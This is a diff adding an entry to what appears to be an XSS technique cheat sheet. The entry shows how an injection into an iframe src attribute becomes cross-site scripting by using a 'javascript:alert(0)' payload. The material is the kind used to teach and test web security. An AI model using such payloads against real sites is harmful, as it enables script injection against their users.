@@ -149,6 +149,33 @@ By [Filedescriptor](http://blog.innerht.ml/cascading-style-scripting/).
 
 ---
 
+## Inside iframe src attribute
+
+
+📝 **Problem**
+
+
+```
+
+<iframe src="[injection-point]">
+
+```
+
+You want to escalate this from iframe injection to XSS
+
+
+💡 **Solution(s):**
+
+
+```
+
+javascript:alert(0)
+
+```
+
+Setting the source to the javascript pseudo-protocol allows you to execute javascript in the context of the top level host
+
+
 
 
 # Contribute
